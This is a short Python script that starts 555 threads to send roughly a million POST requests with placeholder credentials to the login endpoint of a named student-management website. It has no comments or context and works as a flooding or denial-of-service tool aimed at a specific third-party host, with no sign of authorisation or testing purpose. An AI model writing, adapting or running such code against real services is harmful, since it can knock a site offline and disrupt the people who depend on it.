import threading

import requests
import threadpool

c = 1


def post():
    global c
    c += 1
    print(c)
    url = 'http://student-manage.lxhelper.com/api/v1/user_info/login/?page=1&campus='
    res = requests.post(url, json={'username': '@@@@@@@@@@@@', 'password': '$$$$$$$$$$$$$$$$$$$'})
    print('111')



l = range(999999)
pool = threadpool.ThreadPool(555)
tasks = threadpool.makeRequests(post, l)
for task in tasks:
    pool.putRequest(task)
pool.wait()
